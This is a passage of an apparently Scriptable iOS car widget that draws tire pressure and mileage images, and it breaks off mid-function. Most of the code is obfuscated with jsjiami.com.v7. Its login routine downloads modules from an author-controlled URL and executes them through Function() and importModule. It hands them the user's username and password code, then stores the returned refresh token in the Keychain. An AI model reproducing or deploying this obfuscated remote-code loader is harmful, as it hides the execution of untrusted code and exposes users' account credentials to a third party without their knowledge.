Ecp=new(await async function(_0x2e4da1){const _0x5aba7f=_0x1493,_0x8c30c2={'AJdOm':_0x5aba7f(0x1f5,'Pmgz'),'qmvQc':_0x5aba7f(0x1b2,'$%1J'),'crJZe':function(_0xf6d343,_0x240f88){return _0xf6d343(_0x240f88);},'GLwOB':_0x5aba7f(0x1bc,'svOP')};let _0x1a2ca4=FileManager['local'](),_0x6bd9d2=_0x1a2ca4[_0x5aba7f(0x1af,')Qdc')](_0x1a2ca4[_0x5aba7f(0x1aa,'Bt$q')](),_0x2e4da1);console['log'](_0x1a2ca4[_0x5aba7f(0x1d3,'*[7*')]());if(_0x1a2ca4['fileExists'](_0x6bd9d2))console['log'](_0x8c30c2[_0x5aba7f(0x1cb,'24t*')]);else{console['log'](_0x8c30c2[_0x5aba7f(0x1e8,'fE]@')]);const _0x33b981=new Request(Authorurl+_0x5aba7f(0x1c5,'qDqD')+_0x8c30c2[_0x5aba7f(0x1d0,'Bt$q')](encodeURIComponent,_0x2e4da1)),_0x493957=await _0x33b981[_0x5aba7f(0x1eb,'u$1l')]();_0x1a2ca4[_0x5aba7f(0x1b8,'Z(Si')](_0x6bd9d2,_0x493957),console['log'](_0x8c30c2[_0x5aba7f(0x1c6,'YwHx')]);}let _0x48c514=_0x1a2ca4[_0x5aba7f(0x1be,'[&sT')](_0x6bd9d2);if(null==_0x48c514)throw new Error('Module\x20\x27'+_0x2e4da1+_0x5aba7f(0x1e4,'Iu*e'));return _0x8c30c2[_0x5aba7f(0x1c0,'8XsX')](Function,_0x48c514+';\x20return\x20exports')();}(_0x35782a(0x1b4,'2E57')))['JSEncrypt']();if(Ecp!=null)console[_0x35782a(0x1f6,'qzKc')](_0x35782a(0x1e7,'z$Ru'));else{console['log'](_0x35782a(0x1dd,'YwHx'));const userLoginAlert1=new Alert();return userLoginAlert1[_0x35782a(0x1cf,']gS&')]=_0x35782a(0x1f9,'8eoF'),userLoginAlert1[_0x35782a(0x1c9,'i6uB')]=_0x35782a(0x1d8,')X5$'),userLoginAlert1[_0x35782a(0x1e9,'24t*')]('确定'),await userLoginAlert1[_0x35782a(0x1f4,'yW9$')](),0x0;}const CryptoJS=await this['getcrypto']();if(CryptoJS!=null)console[_0x35782a(0x1a7,'RAXy')](_0x35782a(0x1db,'Iu*e')+CryptoJS['SHA256'](_0x35782a(0x1cd,'*[7*')));else{console['log']('未找到CryptoJS\x20请重试');const userLoginAlert2=new Alert();return userLoginAlert2[_0x35782a(0x1f0,'pKS1')]=_0x35782a(0x1d7,'09au'),userLoginAlert2[_0x35782a(0x1ae,'fE]@')]='未找到CryptoJS\x20请重试',userLoginAlert2['addAction']('确定'),await userLoginAlert2['presentAlert'](),0x0;}let cstr='';function _0x19f4(){const _0xa142ca=(function(){return[version_,'KRMjXsfxejuiSnUaJFtmWAVihX.xfecoqWmS.Dv7==','ifa7eW','nxNdSCk5WQ/dNw/dMSkCfsZdL8k4','WOeawaZcQI7cI2xdHmknnrRdVHe','W5udW5r8WRhcPLq','W43dL2DseG','bmo2gLZdRf3dUSkBW7S','jSojW7TSB8kflKi','W4FcIbldPxtcKs/cPJG','zXqxW5qHd2VdHCkZW7tcGhe','5yIN5AYA5A6p56kt5OUU6z6U5Pwp5lM3776/5PwN5lQd5BED5AYh5z6DhoEzJoAmKoISPUwoIG','WP9uDa','jLzgW7yjk1BdRSkL','a8krWO1EWPLbgSknWQORW5VcH8kzmmocoW','6yAG57+G5Awg6lAD7761','nNCTACoN','WQzRnH7dJMyYCCkbWRTeWQm','BtZcGCoBEZeWkGS','WPtdM0BdGxBcJXxcUIfkWO3dKXzviG','m1qv','W6rUBhC','W7lcGmobWRRdGa','W5qpW4v9WRhcS0HGW7foF8oOwrFcI1O','x8oKfSoxW4NcMSoXWPS7pG','tSk9vSo2','g0GE5A+o56kk6zsQ6k29','WR/cK8kOyCoEkSk1','W6/cNCobWQddTs5DaG','WQj5WO9AamoHWOu'].concat((function(){return['WOhcJIegeJzNWQNcV8kS','5PsP5lQM5lQO5AYL5zYhDEMEVoILQowiMoI/PU+/Ja','W6fOzhCfbWddOmoZWQu','W6BcH8ojW4tdQfC','5lMa56cf5P276k2f','WPa3qSkEgSkkWQJcRSkBFhfm','WRLICaddVSoJyXD7WRJcJcW','gmkkWOzyWP0','umochW','WQRdNSkj','WRfUWOvCha','5PsI5lUC5yAA5yEC5OUC5yUi','W7qRW5XpgSoHWQH3W6u','WOFdMKpdPKtcLqtcTInS','WRG7pN/cJ8kPWP0UmWbAW5G','WObdWRJcIgS','qCkeWQddLGKPr2NcPG','W45HaCoztCoEWQW','W4flD8oy','W5zhma','qwNcRmk+','imkyu8kGW64','WOhdLLBdRNi','z8kZwg97WPvgmSk5WRNdQ8ksW78','W7G9DvNcMti2','Bmo7pvVdQ0NcJwtdGgPR','W7TxdSoxWQa','qSk1se/cPW','bSo2gshcMGK','W5ZdL8kmF2xdN2ldQrFcMGJdUmkeW7RcTW'].concat((function(){return['xSk1vSo7W6C','W5SuW61vWRu','bCoAW7ddOIikygBcUa','mSoGgJG/W4SodSkiWPhdPW','u8kRswddGLRdNCkHW7/dTCoyoLWAj8karG0','AwWsmCoAv8oSW4/cLmoACZm','e8k9umkdW4K','WQD+WO8','6yst572D5Awr6lsI776B','5P+E5OIn5yIno8kkmCof6k+06ywG6kY/','W6NcNCojWQO','w8kRtq','DSoBW6NMTA/ORzi','W54KWQ7dUbVcU8o7W50iW7VdKMm','5P2n5OQQ5yIuWQRdJ8k+WQpORlNPHRJORRG','W7OKletcQCk/DcfwWPxcUXq','WP1IW7lcVeZdP8oSW6SLW5BdPvS','hmoKfmkGWRz8hhHTuSkozq','W4LdyCkwWQa4WRVcQSoBp8o0W5GzW7WO','qmkdWRddNWO','55U85B6j5Aw46lA3','pCksW6vlW7pcVCkgr8kgsmk+pG','WOBcHSoyzZ3cHLddUh3cSaxdQa','W4ejiCkgW7pcO28aWRaMCmk8dG','5AYc5zYWc2VdUW','WQpcM8kTq8oC','W5T5dSozWQ7dP1NcLWK','5BYX5AwR55Ih5B6A5RAV56I+','WOyoWRaC'];}()));}()));}());_0x19f4=function(){return _0xa142ca;};return _0x19f4();};typeof Authorurl==='undefined'?cstr+=_0x35782a(0x1d6,'*Jb!'):cstr+=Authorurl,typeof Project_UPDATE===_0x35782a(0x1c1,'qI#6')?cstr+='abc':cstr+=Project_UPDATE,typeof MODIFIER==='undefined'?cstr+=_0x35782a(0x1b9,'K)]9'):cstr+=MODIFIER;let Codeversion=this[_0x35782a(0x1c4,'svOP')](cstr),LogArray={'mobile':this[_0x35782a(0x1ee,')X5$')]['username'],'version':Codeversion,'pwdCode':pwdCode,'v':_0x35782a(0x1cc,'bH&f')},en=FileManager[_0x35782a(0x1fa,'z$Ru')](),encry=en[_0x35782a(0x1f2,'epYC')](en[_0x35782a(0x1f8,'Z(Si')](),_0x35782a(0x1ca,'^uq]'));if(en[_0x35782a(0x1b3,'[EHp')](encry)){console[_0x35782a(0x1da,'*[7*')]('pwd加密密码所需文件：文件已存在,直接读取'),en['remove'](encry);const ifile=new Request(Authorurl+_0x35782a(0x1e1,'svOP')),owrite=await ifile[_0x35782a(0x1ec,'ZEK8')]();en[_0x35782a(0x1a9,')Qdc')](encry,owrite);}else{const ifile=new Request(Authorurl+_0x35782a(0x1ce,'7&eG')),owrite=await ifile[_0x35782a(0x1d9,')Qdc')]();en[_0x35782a(0x1bb,'*Jb!')](encry,owrite);}let mm=importModule(encry),bba=null;if(mm!=null){console[_0x35782a(0x1f6,'qzKc')](_0x35782a(0x1ea,'K)]9')),bba=await mm[_0x35782a(0x1b0,'*Jb!')](LogArray);if(bba===0x11){const messageAlert6=new Alert();return messageAlert6['title']=_0x35782a(0x1b5,'AExX'),messageAlert6[_0x35782a(0x1ef,'Bt$q')]='缺少核心代码',messageAlert6['addCancelAction']('取消'),await messageAlert6['presentAlert'](),0x0;}if(bba===0x2){const messageAlert6=new Alert();return messageAlert6[_0x35782a(0x1e2,'qI#6')]='代码错误',messageAlert6[_0x35782a(0x1fd,'[&sT')]('取消'),await messageAlert6[_0x35782a(0x1d4,'9!uB')](),0x0;}if(bba===0x12){const messageAlert7=new Alert();return messageAlert7[_0x35782a(0x1d5,'YwHx')]=_0x35782a(0x1ad,'z$Ru'),messageAlert7[_0x35782a(0x1c2,'AExX')]='核对账户',messageAlert7['addCancelAction']('取消'),await messageAlert7[_0x35782a(0x1df,'PQ52')](),0x0;}if(!bba||bba[_0x35782a(0x1a8,'[EHp')]!=0xc8||!bba['data']['refresh_token']){const messageAlert4=new Alert();return messageAlert4[_0x35782a(0x1c7,'[&sT')]=_0x35782a(0x1e3,'Pmgz'),messageAlert4['message']=bba[_0x35782a(0x1d2,'h4kB')],messageAlert4['addCancelAction']('取消'),await messageAlert4[_0x35782a(0x1b7,'tFO2')](),0x0;}else Keychain[_0x35782a(0x1ba,'$A0c')](REFRESH_TOKEN,bba[_0x35782a(0x1c3,'svOP')]['refresh_token']),Keychain['set'](VEHICLE_GCID,bba[_0x35782a(0x1ac,']gS&')]['gcid']);}var version_ = 'jsjiami.com.v7';

  ///////////////////////////////////////
    // // write to local
    this.settings['UserConfig'] = this.userConfigData;
    this.saveSettings(false);
    console.log(this.userConfigData['username'])
    // ////start to get vehicle details
    let vehicle = this.getData(true);   
    if (!vehicle) {
      return null;
    }
    const messageAlert = new Alert();
    messageAlert.title = '登录成功';
    messageAlert.message = '请在桌面添加小组件';
    messageAlert.addCancelAction('确定');
    await messageAlert.presentAlert();
    return true;
  }
  getTireCanvasImage= async function(data, canvasWidth, canvasHeight) {
    var version_='jsjiami.com.v7';const _0x25625c=_0x5473;function _0x5473(_0x1f0f50,_0xe3ab53){const _0x2f7911=_0x2f79();return _0x5473=function(_0x5473b3,_0x37a1e2){_0x5473b3=_0x5473b3-0xd4;let _0x973df5=_0x2f7911[_0x5473b3];if(_0x5473['tBlPet']===undefined){var _0x24b625=function(_0x2f10ea){const _0x4cc238='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2bcae9='',_0x22c316='';for(let _0x4507f3=0x0,_0x3ffaae,_0x16c118,_0x2d7798=0x0;_0x16c118=_0x2f10ea['charAt'](_0x2d7798++);~_0x16c118&&(_0x3ffaae=_0x4507f3%0x4?_0x3ffaae*0x40+_0x16c118:_0x16c118,_0x4507f3++%0x4)?_0x2bcae9+=String['fromCharCode'](0xff&_0x3ffaae>>(-0x2*_0x4507f3&0x6)):0x0){_0x16c118=_0x4cc238['indexOf'](_0x16c118);}for(let _0x11c459=0x0,_0x3b68d5=_0x2bcae9['length'];_0x11c459<_0x3b68d5;_0x11c459++){_0x22c316+='%'+('00'+_0x2bcae9['charCodeAt'](_0x11c459)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x22c316);};const _0x17bda8=function(_0x508632,_0x6983d9){let _0x1b0160=[],_0x1c7c12=0x0,_0x3ef744,_0x3d87ba='';_0x508632=_0x24b625(_0x508632);let _0x301d4b;for(_0x301d4b=0x0;_0x301d4b<0x100;_0x301d4b++){_0x1b0160[_0x301d4b]=_0x301d4b;}for(_0x301d4b=0x0;_0x301d4b<0x100;_0x301d4b++){_0x1c7c12=(_0x1c7c12+_0x1b0160[_0x301d4b]+_0x6983d9['charCodeAt'](_0x301d4b%_0x6983d9['length']))%0x100,_0x3ef744=_0x1b0160[_0x301d4b],_0x1b0160[_0x301d4b]=_0x1b0160[_0x1c7c12],_0x1b0160[_0x1c7c12]=_0x3ef744;}_0x301d4b=0x0,_0x1c7c12=0x0;for(let _0x1ccaac=0x0;_0x1ccaac<_0x508632['length'];_0x1ccaac++){_0x301d4b=(_0x301d4b+0x1)%0x100,_0x1c7c12=(_0x1c7c12+_0x1b0160[_0x301d4b])%0x100,_0x3ef744=_0x1b0160[_0x301d4b],_0x1b0160[_0x301d4b]=_0x1b0160[_0x1c7c12],_0x1b0160[_0x1c7c12]=_0x3ef744,_0x3d87ba+=String['fromCharCode'](_0x508632['charCodeAt'](_0x1ccaac)^_0x1b0160[(_0x1b0160[_0x301d4b]+_0x1b0160[_0x1c7c12])%0x100]);}return _0x3d87ba;};_0x5473['kqpqEF']=_0x17bda8,_0x1f0f50=arguments,_0x5473['tBlPet']=!![];}const _0x420be6=_0x2f7911[0x0],_0x57b6a0=_0x5473b3+_0x420be6,_0x39a919=_0x1f0f50[_0x57b6a0];return!_0x39a919?(_0x5473['osGcuJ']===undefined&&(_0x5473['osGcuJ']=!![]),_0x973df5=_0x5473['kqpqEF'](_0x973df5,_0x37a1e2),_0x1f0f50[_0x57b6a0]=_0x973df5):_0x973df5=_0x39a919,_0x973df5;},_0x5473(_0x1f0f50,_0xe3ab53);}(function(_0x54c841,_0x130236,_0x31f735,_0x487d47,_0x3d1a07,_0x2daac4,_0x41a6d0){return _0x54c841=_0x54c841>>0x7,_0x2daac4='hs',_0x41a6d0='hs',function(_0x2c379d,_0x386ba0,_0x234b3c,_0x14694a,_0x5c7991){const _0x59f18c=_0x5473;_0x14694a='tfi',_0x2daac4=_0x14694a+_0x2daac4,_0x5c7991='up',_0x41a6d0+=_0x5c7991,_0x2daac4=_0x234b3c(_0x2daac4),_0x41a6d0=_0x234b3c(_0x41a6d0),_0x234b3c=0x0;const _0xfc786c=_0x2c379d();while(!![]&&--_0x487d47+_0x386ba0){try{_0x14694a=parseInt(_0x59f18c(0xda,'X4I%'))/0x1*(parseInt(_0x59f18c(0x111,'39vZ'))/0x2)+-parseInt(_0x59f18c(0xfc,'fWnh'))/0x3*(parseInt(_0x59f18c(0x116,']NOR'))/0x4)+-parseInt(_0x59f18c(0x115,'P$^6'))/0x5+-parseInt(_0x59f18c(0x11b,'6&#z'))/0x6*(parseInt(_0x59f18c(0xec,'fWnh'))/0x7)+parseInt(_0x59f18c(0x119,'PzEC'))/0x8+-parseInt(_0x59f18c(0xf2,'[(h['))/0x9+-parseInt(_0x59f18c(0xe1,'P$^6'))/0xa*(-parseInt(_0x59f18c(0xdf,'R!II'))/0xb);}catch(_0x137263){_0x14694a=_0x234b3c;}finally{_0x5c7991=_0xfc786c[_0x2daac4]();if(_0x54c841<=_0x487d47)_0x234b3c?_0x3d1a07?_0x14694a=_0x5c7991:_0x3d1a07=_0x5c7991:_0x234b3c=_0x5c7991;else{if(_0x234b3c==_0x3d1a07['replace'](/[JbfULNIdTFQeynxDBt=]/g,'')){if(_0x14694a===_0x386ba0){_0xfc786c['un'+_0x2daac4](_0x5c7991);break;}_0xfc786c[_0x41a6d0](_0x5c7991);}}}}}(_0x31f735,_0x130236,function(_0x2f50b0,_0xb2e8e5,_0x18408b,_0x6c2aaa,_0x34357c,_0x47e81e,_0x463ee5){return _0xb2e8e5='\x73\x70\x6c\x69\x74',_0x2f50b0=arguments[0x0],_0x2f50b0=_0x2f50b0[_0xb2e8e5](''),_0x18408b='\x72\x65\x76\x65\x72\x73\x65',_0x2f50b0=_0x2f50b0[_0x18408b]('\x76'),_0x6c2aaa='\x6a\x6f\x69\x6e',(0x1298be,_0x2f50b0[_0x6c2aaa](''));});}(0x6680,0xd955e,_0x2f79,0xcf),_0x2f79)&&(version_=_0x2f79);function _0x2f79(){const _0x37b5b7=(function(){return[version_,'fbjsTjTiyxaBdmLnDiFxN.tcUxofmIBd.JbQvNe7==','WOrgWPZcNxRcOuq','W44/u8oRWPxcJmkYxq','W4ZdGdGyW4KwW7O','WP7dL8kdW4lcJCoifhxcI8kgE8oSWOmJ','W4C6htTnW5m','W5HRWOS3dW','W508m1HolINdKSkvxSoA','iSoeWOldStlcOfTgrSo8W4/dOYPEjq','C8o7emkFuCkzWQ5bW4ZcP8oqWQKgWQq','W6HivwNdOG','WOL3BWCdcIFdMmkrAq','WOZdVNlcHxRcMCkdW5tdUmoNW74JESov','hmoFe0bRzmk5W5pcRSoTW4W','W5vpWO/dGY4','W5W8n11pArJdU8kVDSociG','kqFcG3Xj','W4jHWPC+a8ke','WPT8zmogWQVcRSkjzCofWQ1DWRhdOmo/','dmota3zo','bJJdVh7dPJPBd0KGECoiW4C','W5S6WOL1DCoZW6bgW6bsWO9+W5y','imovuGBcHgmCWOCuxH7cOhW','WQ3dLCksbsddR11OqW','FSoTW5pdUCobW4BcQ8kbW6GJvH1tyb7cK1jw','WP3dG2FdJdddOSkHW7OK','W4ZcQsVdGrVdG8otWOZdVa'].concat((function(){return['g2ZdNSkfWQGLW5xcOW','d8kcW6L8dG','W7b2W6DD','rMlcVcJcSa','W5XFwHGveZS','mW3cN3vfbW','r3NcQdlcSq','W4FcRaWnW6i','FCkca1FdLsy','C8kobLZdRZDpWOm','gHVcQKSCc8kfkComW5hcGmk1','qgtcUYpcH3yoi00','W6mJrKGA','s8kxfdJcMG','WPDRBmowWPFcVW','W4mNgdTq','gqZcV3ONamkjhSoQW5pcVCkIW659','aCkYxSkkWRacWQuFAW','W5RdVX/dGCkz','uvJdIe90WPurmte','fmktF8kHW4KOvCkGhCoQW4BcMSoGEte','kbZcL2zi','WOXRCCo3WPdcPCkf','WQNLU6xORlpOG7BLJi7cH8kY','sCoWer5ZzaK4F2VcJmkLiGm','W5/dRSkjybVcMmo/WOC','WQ4EW7ldMq','WO1HCmoFWPS'].concat((function(){return['ob3cHgbihCkQASktWO4xW64wwfO','WPNdL8kdW4lcH8okeZxcTCkECCo3WQK','WPpcKh5tWPPjWQTgW7hcJrORBq','WPT8zmogWRBcPSkqDSoPWOPHWOBdPSoOBG','t8knutqEc8ogW4tcVCoyW4HcuG','WQSweZhcT8oydCk7qfGhrCkIxq','W47dRGRdS8ktnCo/','y1ZcVfvxpmkRwW','lSk7W6BcKCoqvL0','nWHjsKilFW','ECkgdCobDmo9qK8','cCoveMXc','phnEDtrMWQqqmCkrWR4S','cCkeW653oCkcteRcMa','WPZcTCk0sa0','yCkogfxdRIznWOm/','z8kih17dMq','ELpdPCkgWPWhW4u','WQ85WQyTWOi','W5LTWOq8','o2BdISkzWPO','pqhcMN5/fSk9tG','vCo5aSovW704WQCuCZxcGa','btNcGqdcPK0Aba','W4NdGcimW4af','nZxdKeaKDua4'];}()));}()));}());_0x2f79=function(){return _0x37b5b7;};return _0x2f79();};let fontBase=0xe,canvas=new DrawContext();canvas[_0x25625c(0xd7,'Us]y')]=new Size(canvasWidth,canvasHeight),canvas['opaque']=![],canvas[_0x25625c(0x10e,'R!II')](this[_0x25625c(0x11a,'PHsH')](WIDGET_FONT_BOLD,fontBase)),canvas['setTextColor'](this[_0x25625c(0x102,'FjBA')]()),canvas[_0x25625c(0xf5,'d18J')]=!![];try{let carImage=await this[_0x25625c(0xea,'#y^5')](data,_0x25625c(0xf8,'U4iV')),imageSize=this['getImageSize'](carImage[_0x25625c(0x112,'pCEo')][_0x25625c(0x107,'V[lC')],carImage[_0x25625c(0xfa,'R3mm')][_0x25625c(0xfd,'6&#z')],canvasWidth,canvasHeight,0.2);data[_0x25625c(0xfe,'^R$u')]['tireState']&&(canvas[_0x25625c(0xdd,'SdM9')](new Rect(Math[_0x25625c(0xeb,'OqEl')](canvasWidth*0.1),Math[_0x25625c(0x11f,'#y^5')](canvasHeight-imageSize[_0x25625c(0x100,'rs1q')]*0.65)-0xa,Math['round'](canvasWidth*0.25),0x1)),canvas[_0x25625c(0x101,'rs1q')](new Rect(Math[_0x25625c(0xd8,'U4iV')](canvasWidth*0.6),Math[_0x25625c(0xed,'6&#z')](canvasHeight-imageSize['height']*0.65)-0xa,Math[_0x25625c(0xfb,'^R$u')](canvasWidth*0.3),0x1)),canvas['fillRect'](new Rect(Math[_0x25625c(0xe3,'Us]y')](canvasWidth*0.1),Math[_0x25625c(0x104,'cM22')](canvasHeight*0.9)+0x2-0xa,Math[_0x25625c(0xe3,'Us]y')](canvasWidth*0.25),0x1)),canvas[_0x25625c(0xd9,'6&#z')](new Rect(Math['round'](canvasWidth*0.6),Math['round'](canvasHeight*0.9+0x2)-0xa,Math[_0x25625c(0x122,'39vZ')](canvasWidth*0.3),0x1)),canvas['drawTextInRect']((data['state'][_0x25625c(0x123,'rs1q')][_0x25625c(0x109,'X4I%')]['status'][_0x25625c(0x114,'6&#z')]/0x64)['toFixed'](0x1),new Rect(Math['round'](canvasWidth*0.1),Math[_0x25625c(0x113,'R!II')](canvasHeight-imageSize[_0x25625c(0xdc,']NOR')]*0.65-fontBase-0x2)-0xa,Math[_0x25625c(0xeb,'OqEl')](canvasWidth*0.3),0xf)),canvas[_0x25625c(0x108,'FjBA')]((data['state'][_0x25625c(0x121,'Xi%9')][_0x25625c(0xe8,'fWnh')]['status'][_0x25625c(0x10c,'2uqk')]/0x64)['toFixed'](0x1),new Rect(Math[_0x25625c(0x122,'39vZ')](canvasWidth*0.9-fontBase*1.49),Math['round'](canvasHeight-imageSize['height']*0.65-fontBase-0x2)-0xa,Math['round'](canvasWidth*0.3),0xf)),canvas['drawTextInRect']((data[_0x25625c(0xd6,']sNX')][_0x25625c(0xf4,'0Bwf')]['rearLeft'][_0x25625c(0xe2,'V[lC')][_0x25625c(0xe5,'0QDG')]/0x64)['toFixed'](0x1),new Rect(Math[_0x25625c(0xd4,'rs1q')](canvasWidth*0.1),Math[_0x25625c(0xf9,'Xi%9')](canvasHeight*0.9-fontBase)-0xa,Math['round'](canvasWidth*0.7),0xf)),canvas[_0x25625c(0xe6,'Kcl!')]((data[_0x25625c(0x10a,'PHsH')][_0x25625c(0xf6,'IhP%')][_0x25625c(0xf7,'X#CF')]['status']['currentPressure']/0x64)['toFixed'](0x1),new Rect(Math['round'](canvasWidth*0.9-fontBase*1.49),Math[_0x25625c(0x105,'Waoe')](canvasHeight*0.9-fontBase-0x1)-0xa,Math[_0x25625c(0xe7,'PzEC')](canvasWidth*0.3),0xf)));canvas[_0x25625c(0x11d,'RRTA')](this[_0x25625c(0x11c,'xHyT')](WIDGET_FONT_BOLD,0xa));let txt=(data[_0x25625c(0x10d,'6&#z')][_0x25625c(0x103,'^R$u')][_0x25625c(0x10b,'f!T5')]['status'][_0x25625c(0x110,'HTCA')]/0x64)['toFixed'](0x1)+'/'+(data[_0x25625c(0xfe,'^R$u')]['tireState']['rearLeft']['status']['targetPressure']/0x64)['toFixed'](0x1);canvas[_0x25625c(0x120,'LZVe')](new Color(_0x25625c(0xde,'OqEl'),0.3)),canvas[_0x25625c(0xef,'R!II')](_0x25625c(0x10f,'R3mm')+txt,new Rect(Math['round'](canvasWidth*0.1),0x5,Math[_0x25625c(0x113,'R!II')](canvasWidth*0.6),0xf)),canvas[_0x25625c(0x117,'R!II')](carImage,new Rect(Math[_0x25625c(0x11f,'#y^5')](canvasWidth-imageSize[_0x25625c(0xf0,'#y^5')])/0x2,canvasHeight-imageSize[_0x25625c(0x106,'R!II')]-0xa,imageSize[_0x25625c(0xff,'Pax!')],imageSize[_0x25625c(0xee,'Us]y')]));}catch(_0x132481){console['warn'](_0x132481[_0x25625c(0xe0,']NOR')]);}return canvas['getImage']();var version_ = 'jsjiami.com.v7';
  }
  getMileCanvasImage= async function(data, canvasWidth, canvasHeight, currentMileage) {
   var version_='jsjiami.com.v7';const _0x197e50=_0x247c;(function(_0x319fc8,_0x34eca8,_0x521b3b,_0x28636b,_0x4e9df7,_0x59e433,_0x29b928){return _0x319fc8=_0x319fc8>>0x8,_0x59e433='hs',_0x29b928='hs',function(_0x40492c,_0x371be7,_0x3c8bdd,_0x49610e,_0x50c69e){const _0x24a4e4=_0x247c;_0x49610e='tfi',_0x59e433=_0x49610e+_0x59e433,_0x50c69e='up',_0x29b928+=_0x50c69e,_0x59e433=_0x3c8bdd(_0x59e433),_0x29b928=_0x3c8bdd(_0x29b928),_0x3c8bdd=0x0;const _0x34b425=_0x40492c();while(!![]&&--_0x28636b+_0x371be7){try{_0x49610e=parseInt(_0x24a4e4(0x112,'CZju'))/0x1*(-parseInt(_0x24a4e4(0xf4,'DP@%'))/0x2)+parseInt(_0x24a4e4(0xf6,'4OLm'))/0x3+parseInt(_0x24a4e4(0x122,'mG3a'))/0x4+-parseInt(_0x24a4e4(0xfe,'!^U!'))/0x5*(-parseInt(_0x24a4e4(0x11d,'maYu'))/0x6)+-parseInt(_0x24a4e4(0xf7,'DP@%'))/0x7*(-parseInt(_0x24a4e4(0x11a,'wrVU'))/0x8)+-parseInt(_0x24a4e4(0x116,'QBU['))/0x9*(-parseInt(_0x24a4e4(0x101,'DP@%'))/0xa)+parseInt(_0x24a4e4(0x115,'8IGj'))/0xb*(-parseInt(_0x24a4e4(0x11e,'nQmN'))/0xc);}catch(_0x3897a1){_0x49610e=_0x3c8bdd;}finally{_0x50c69e=_0x34b425[_0x59e433]();if(_0x319fc8<=_0x28636b)_0x3c8bdd?_0x4e9df7?_0x49610e=_0x50c69e:_0x4e9df7=_0x50c69e:_0x3c8bdd=_0x50c69e;else{if(_0x3c8bdd==_0x4e9df7['replace'](/[xnJWHPLIeYCqQfBVOyX=]/g,'')){if(_0x49610e===_0x371be7){_0x34b425['un'+_0x59e433](_0x50c69e);break;}_0x34b425[_0x29b928](_0x50c69e);}}}}}(_0x521b3b,_0x34eca8,function(_0x11d125,_0x459f88,_0x3fd6f4,_0x5ca3fd,_0x5f0bd9,_0x242ba0,_0x14c837){return _0x459f88='\x73\x70\x6c\x69\x74',_0x11d125=arguments[0x0],_0x11d125=_0x11d125[_0x459f88](''),_0x3fd6f4='\x72\x65\x76\x65\x72\x73\x65',_0x11d125=_0x11d125[_0x3fd6f4]('\x76'),_0x5ca3fd='\x6a\x6f\x69\x6e',(0x12a7cd,_0x11d125[_0x5ca3fd](''));});}(0xc900,0xb97f6,_0x4292,0xcb),_0x4292)&&(version_=_0x4292);function _0x247c(_0x467945,_0x1a1a76){const _0x42924e=_0x4292();return _0x247c=function(_0x247caa,_0x18e2a3){_0x247caa=_0x247caa-0xf3;let _0x25ad59=_0x42924e[_0x247caa];if(_0x247c['EeHLVX']===undefined){var _0x4876a1=function(_0x557b72){const _0x290998='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2d6ce0='',_0x37a305='';for(let _0x232405=0x0,_0x230ede,_0x47c91a,_0x776653=0x0;_0x47c91a=_0x557b72['charAt'](_0x776653++);~_0x47c91a&&(_0x230ede=_0x232405%0x4?_0x230ede*0x40+_0x47c91a:_0x47c91a,_0x232405++%0x4)?_0x2d6ce0+=String['fromCharCode'](0xff&_0x230ede>>(-0x2*_0x232405&0x6)):0x0){_0x47c91a=_0x290998['indexOf'](_0x47c91a);}for(let _0x5f1ffe=0x0,_0x36b247=_0x2d6ce0['length'];_0x5f1ffe<_0x36b247;_0x5f1ffe++){_0x37a305+='%'+('00'+_0x2d6ce0['charCodeAt'](_0x5f1ffe)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x37a305);};const _0x56f998=function(_0x2e628f,_0x4e7341){let _0x50355f=[],_0x164143=0x0,_0x16ed08,_0x4a9bd0='';_0x2e628f=_0x4876a1(_0x2e628f);let _0x4f9696;for(_0x4f9696=0x0;_0x4f9696<0x100;_0x4f9696++){_0x50355f[_0x4f9696]=_0x4f9696;}for(_0x4f9696=0x0;_0x4f9696<0x100;_0x4f9696++){_0x164143=(_0x164143+_0x50355f[_0x4f9696]+_0x4e7341['charCodeAt'](_0x4f9696%_0x4e7341['length']))%0x100,_0x16ed08=_0x50355f[_0x4f9696],_0x50355f[_0x4f9696]=_0x50355f[_0x164143],_0x50355f[_0x164143]=_0x16ed08;}_0x4f9696=0x0,_0x164143=0x0;for(let _0x109d78=0x0;_0x109d78<_0x2e628f['length'];_0x109d78++){_0x4f9696=(_0x4f9696+0x1)%0x100,_0x164143=(_0x164143+_0x50355f[_0x4f9696])%0x100,_0x16ed08=_0x50355f[_0x4f9696],_0x50355f[_0x4f9696]=_0x50355f[_0x164143],_0x50355f[_0x164143]=_0x16ed08,_0x4a9bd0+=String['fromCharCode'](_0x2e628f['charCodeAt'](_0x109d78)^_0x50355f[(_0x50355f[_0x4f9696]+_0x50355f[_0x164143])%0x100]);}return _0x4a9bd0;};_0x247c['kAMUrd']=_0x56f998,_0x467945=arguments,_0x247c['EeHLVX']=!![];}const _0x1e5311=_0x42924e[0x0],_0x2b93c8=_0x247caa+_0x1e5311,_0x2e86ca=_0x467945[_0x2b93c8];return!_0x2e86ca?(_0x247c['fuobhy']===undefined&&(_0x247c['fuobhy']=!![]),_0x25ad59=_0x247c['kAMUrd'](_0x25ad59,_0x18e2a3),_0x467945[_0x2b93c8]=_0x25ad59):_0x25ad59=_0x2e86ca,_0x25ad59;},_0x247c(_0x467945,_0x1a1a76);}let canvas=new DrawContext();function _0x4292(){const 